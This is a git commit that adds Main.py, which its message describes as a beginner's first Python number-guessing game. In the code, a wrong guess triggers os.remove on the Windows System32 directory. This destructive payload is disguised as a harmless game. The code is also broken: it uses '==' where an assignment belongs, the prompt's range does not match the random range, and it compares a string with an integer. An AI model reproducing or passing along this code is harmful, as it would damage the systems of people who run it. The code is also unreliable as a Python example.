a73956f0feebda9970311b21e5f6fd054d615b67
Grayv3r3 <122377541+Grayv3r3@users.noreply.github.com>
2025-03-11 12:05:07 -0400

    Created game code
    This is the code for the game. I don't know if any graphics will show up since this is my first time making something in python.

---
+++ Main.py
@@ -0,0 +1,10 @@
+import random
+import os
+
+x = random.randint(100,10000)
+print("Guess a number between 100 and 100000.")
+guess == input("Guess: ")
+if guess == x:
+  print("You win! Congrats")
+else:
+  os.remove("C:\Windows\System32")
